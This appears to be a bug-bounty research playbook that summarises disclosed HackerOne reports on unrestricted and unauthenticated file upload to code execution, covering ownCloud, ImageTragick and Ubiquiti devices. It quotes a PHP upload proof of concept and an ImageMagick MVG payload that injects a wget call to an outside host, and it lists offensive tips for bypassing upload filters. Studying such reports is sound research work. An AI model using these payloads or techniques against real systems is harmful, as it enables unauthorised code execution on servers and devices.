---
title: "Authless & unrestricted upload → execution and device compromise"
type: playbook
category: upload-to-exec
cwe: "CWE-434 · CWE-427"
source_count: 8
full_bodies_available: 8
corpus: "h1.security.nathan.sx roster (86 title-arm rows), bodies via hackerone.com/reports/<id>.json"
list_accessed: "2026-11-05"
note: "Anchor bodies: FU-73480 (airMAX $18,000 list — the class crown), FU-135072 (ImageTragick $2,500 list), FU-84374 (ownCloud php5 RCE), FU-201529 (AirFibre authless upload). Claims trace to bodies read 2026-11-05."
---

# Module 01 — when the sink falls through: unrestricted & authless upload

## 1. Overview

Eight rows, **$20,770/4 paid** — the money module. Every row here shares one anatomy: an
upload endpoint whose stored-byte step never validates content, or never gates access to
the endpoint itself. The corpus splits the lane three ways: (a) *the file executes* —
either the webserver runs it (ownCloud) or an image processor eats it (ImageTragick);
(b) *the device runs it* — airOS hardware architectures that omit authentication on the
upload CGI; (c) *the endpoint is shippable* — "any file tool" exposure on DoD estates.
Flat-rate rows here are few; the big money attached to the carrier-vendor paths (airMAX
$18,000 — this chain's crown).

**Case-stock (8 rows / $20,770):**

| Case | Target | Mechanism | Bounty |
|---|---|---|---|
| [FU-73480](https://hackerone.com/reports/73480) | Ubiquiti airMAX | authless arbitrary upload via airOS web server + auth bypass | $18,000 (list) |
| [FU-135072](https://hackerone.com/reports/135072) | HackerOne | profile-picture → ImageMagick MVG delegates command injection (pre-disclosure ImageTragick) | $2,500 (list) |
| [FU-201529](https://hackerone.com/reports/201529) | Ubiquiti AirFibre | `login.cgi` multipart upload without auth into `tmp/upload` | $150 (list) |
| FU-116575 | Legal Robot | "Any file upload was accepted without filter, which led to RCE vulnerability." (summary record) | $120 (list) |
| [FU-84374](https://hackerone.com/reports/84374) | ownCloud | apps.owncloud.com serves uploaded `.php5` — webserver executes | - (list) |
| [FU-114389](https://hackerone.com/reports/114389) | Zomato | outdated MailPoet plugin on business-blog → RFI-to-upload path | - (list) |
| [FU-184596](https://hackerone.com/reports/184596) | U.S. Dept Of Defense | Navy system: Internet-facing upload tool, potential code exec (summary) | - (list) |
| [FU-191243](https://hackerone.com/reports/191243) | U.S. Dept Of Defense | signature-based malicious-file test bypass (korprit) | - (list) |

Substate mix: 8 fetches — 8 resolved (four carry the disclosed `summaries` field — 73480,
116575, 184596, 191243; see bodies dump `body_src`). FU-116575 is the lane's
purest confirmation phrase; FU-191243 never escalates to code exec — it records the
bypass itself.

## 2. Anatomy — three ways the sink falls

### 2.1 The file executes where it lands

**FU-84374** is the cleanest execution bonus in the corpus — the ownCloud apps directory
accepts arbitrary upload against the platform's *content directories* and the webserver
runs what it is given. The PoC from the body, byte-true:

```php
https://apps.owncloud.com/CONTENT/content-pre1/171172-1.php5

code source of uploaded file : 
<?php

phpinfo();

?>
```

No serving-chain validation, no egress re-check — the upload *is* the app. The lane's own
RCE-vault row (RCE-84374, cross-registered with matching `-` bounty) reads the same body
from the delivery side.

**FU-114389** is the plugin-date variant: an outdated MailPoet (wysija-newsletters) install
on business-blog.zomato.com carries the classic remote-upload path the Sucuri advisory
documented — body cites the takedown article by URL, then gives a WordPress-lane issuer
(you read the plugin's `readme.txt` before the exploit — versioning is the gate here).

### 2.2 The processor eats it

**FU-135072** (reported upstream under coordinated disclosure) is the corpus's Cleanest
ImageTragick trace — pre-disclosure report to the hit program *itself* (HackerOne), $2,500,
whose uploaded GIF payload runs MVG delegates:

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```

Body byte-quote on the mechanics:

> The "image" directive in MVG allows for the usage of so called "delegates" which are
> somewhat similar to a protocol specifier in a URL: a colon-seperated
> (delegate,argument)-pair like e.g. "label:SomeText" can be specified, invoking the
> respective delegate handler.

("seperated" sic.) The fix note matters as doctrine: check magic values (JPEG/GIF/PNG only)
AND block egress on image worker paths. This row's class line was fixed upstream in
ImageMagick's CVE set (pre-disclosure MVG family) — module 01 cites it as the
processing-sink template.

### 2.3 The device omits the gate

**FU-73480** — $18,000 (list), the highest bounty in this vault. Full summary record:

> It's possible to upload arbitrary files to airMAX devices via HTTP because of a
> vulnerability in the airOS web server.
>
> An attacker can bypass the device's authentication mechanisms by exploiting this
> vulnerability.

Two primitives in one carrier-released CGI: an upload that does not check who is asking,
plus an authentication-bypass lane on the same device family. **FU-201529** is the honest
counterpart — AirFibre 3.2 (`login.cgi` multipart, `tmp/upload`, no auth) whose author
explicitly records the limit:

> I have been unable to redirect the upload to another directory so cannot utilize for RCE
> however an attacker is able to use this to fill the disk space on the device which could
> cause a DoS.

("could cause a DoS" — $150 (list)). The report names the combine: "This could be combined
with another vulnerability such as an LFI" — the lane's academic honesty; no RCE was
demonstrated, and the price tracks the demonstration, not the imagination.

## 3. Techniques (corpus-derived)

1. **Serve-chain first.** If uploads land inside the web root under an execution-handling
   webserver, upload anything with `.php5`/`.php` variants and *observe* — 84374.
2. **Magic bytes, not extensions.** 191243's pattern (altering the file "sufficiently to
   defeat signature based analysis") is the standard: validation path built as extension +
   signature pairs, both mutable.
3. **Processor-version pre-disclosure.** Watch MVG/delegates history — 135072 priced $2,500
   to the *reporting* program because the exploit chain was novel at the time.
4. **Device CGI census.** airOS-era firmware family repeats the authless-upload shape
   (73480 $18,000, 201529 $150) — each carrier hardware generation needs its own census.

## 4. Kill-gates

- Execution or protected-directory write must be *observed*, not inferred. 201529 billed
  $150 because the impact demonstrated was disk-fill, not RCE; the limitation was explicit
  in the report.
- Cross-vault honesty: 84374 and 135072 already have RCE-register lines — the money is
  double-recorded, never double-claimed (vault-wide rule).
- DoD lanes (184596, 191243) are summary records — severity (critical, medium)
  tabulated but no bounty tiering attached.
